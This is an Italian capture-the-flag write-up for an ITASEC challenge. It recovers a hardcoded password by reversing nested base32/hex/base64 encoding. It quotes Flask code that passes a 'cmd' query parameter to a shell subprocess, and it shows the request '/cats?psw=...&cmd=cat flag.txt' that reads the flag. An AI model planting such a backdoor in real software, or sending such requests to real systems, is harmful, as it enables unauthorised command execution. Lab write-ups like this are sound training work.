@@ -1,0 +1,17 @@
+nel codice dato dalla prima challenge c'è una route cats che controlla se l'account ha comprato le prime 2 flag
+poi nel codice c'è una variabilee cat_food che viene codificata se faccio la funzione inversa trovo che la psw è ---P4ssw0rd$$$$$$uperSicura@@###!meaw---
+
+ if flag1 and flag2 and request.args.get('psw') == base64.b64decode(bytes.fromhex(base64.b32decode(bytes.fromhex(cat_food.replace(" ", "")).decode()).decode()).decode()).decode():
+        if request.args.get('cmd') is None:
+            return ""
+        else:
+            try:
+                return subprocess.run(['./shell', request.args.get('cmd')], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=0.5).stdout.decode()
+            except Exception:
+                return "0_0"
+
+
+faccio la richiesta a /cats e mi abilita anche la shell linux quindi 
+/cats?psw=---P4ssw0rd%24%24%24%24%24%24uperSicura%40%40%23%23%23%21meaw---&cmd=cat flag.txt 
+
+ITASEC{An_inn0cent_(and_Cute)_AP1}
